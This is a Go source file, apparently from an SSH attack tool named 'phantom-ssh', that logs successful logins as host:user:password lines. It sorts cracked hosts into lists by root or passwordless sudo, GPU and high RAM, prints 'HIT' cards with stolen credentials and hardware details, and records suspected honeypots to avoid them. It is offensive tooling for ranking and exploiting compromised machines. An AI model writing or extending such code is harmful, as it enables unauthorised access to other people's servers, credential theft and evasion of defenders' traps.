package triage

import (
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"phantom-ssh/pkg/honeypot"
)

// Writer handles thread-safe append operations to categorized result files
type ResultWriter struct {
	mu        sync.Mutex
	outputDir string
}

// NewResultWriter creates an initialized result writer
func NewResultWriter(outputDir string) (*ResultWriter, error) {
	if outputDir == "" {
		outputDir = "."
	}
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return nil, err
	}
	return &ResultWriter{
		outputDir: outputDir,
	}, nil
}

// appendLine writes a line to a file in outputDir
func (rw *ResultWriter) appendLine(filename, line string) {
	rw.mu.Lock()
	defer rw.mu.Unlock()

	p := filepath.Join(rw.outputDir, filename)
	f, err := os.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	_, _ = f.WriteString(line + "\n")
}

// RecordGood saves a verified successful SSH connection with hardware classification
func (rw *ResultWriter) RecordGood(target, user, pass string, probe *honeypot.ShellProbeResult, rtt time.Duration) {
	credLine := fmt.Sprintf("%s:%s:%s", target, user, pass)

	// 1. Standard goods file
	rw.appendLine("goods.txt", credLine)

	if probe == nil {
		return
	}

	// 2. Root / Passwordless Sudo classification
	if probe.IsRoot || probe.HasSudo {
		priv := "ROOT"
		if !probe.IsRoot && probe.HasSudo {
			priv = "SUDO_NOPASSWD"
		}
		rootLine := fmt.Sprintf("%s [%s | %s | %s Cores | %s MB RAM]",
			credLine, priv, probe.OSName, probe.CPUCores, probe.RAMMB)
		rw.appendLine("root.txt", rootLine)
	}

	// 3. GPU / Hardware Acceleration classification
	if probe.GPUInfo != "" && !strings.EqualFold(probe.GPUInfo, "none") {
		gpuLine := fmt.Sprintf("%s [GPU: %s | %s | %s Cores | %s MB RAM]",
			credLine, probe.GPUInfo, probe.OSName, probe.CPUCores, probe.RAMMB)
		rw.appendLine("gpu.txt", gpuLine)
	}

	// 4. High RAM classification (>= 16 GB)
	if ramVal, err := strconv.Atoi(probe.RAMMB); err == nil {
		if ramVal >= 15000 { // ~16GB or higher
			highRamLine := fmt.Sprintf("%s [RAM: %d MB (%.1f GB) | %s | %s Cores]",
				credLine, ramVal, float64(ramVal)/1024.0, probe.OSName, probe.CPUCores)
			rw.appendLine("high_ram.txt", highRamLine)
		}
	}

	// 5. Detailed diagnostic report
	detailCard := fmt.Sprintf(`╔══════════════════════════════════════════════════════════════
║ 🎯 PHANTOM-SSH HIT: %s
╠══════════════════════════════════════════════════════════════
║ 🔑 Credentials : %s:%s
║ 🐧 OS / Kernel : %s (%s)
║ 👤 Privileges  : UID=%s (Root: %t, Sudo: %t)
║ ⚡ CPU Cores   : %s
║ 📟 RAM Total   : %s MB
║ 🎮 GPU Device  : %s
║ 💾 Disk Usage  : %s
║ ⏱️ Response RTT: %v
║ 🕒 Discovered  : %s
╚══════════════════════════════════════════════════════════════`,
		target, user, pass, probe.OSName, probe.Kernel,
		probe.UserID, probe.IsRoot, probe.HasSudo,
		probe.CPUCores, probe.RAMMB,
		probe.GPUInfo, probe.DiskInfo,
		rtt.Round(time.Millisecond),
		time.Now().Format("2006-01-02 15:04:05"))

	rw.appendLine("detailed.txt", detailCard)
}

// RecordHoneypot logs disqualified honeypots
func (rw *ResultWriter) RecordHoneypot(target, user, pass string, verdict *honeypot.HoneypotVerdict) {
	line := fmt.Sprintf("%s:%s:%s [Honeypot Score: %d | Reasons: %s]",
		target, user, pass, verdict.Score, strings.Join(verdict.Reasons, "; "))
	rw.appendLine("honeypots.txt", line)
}
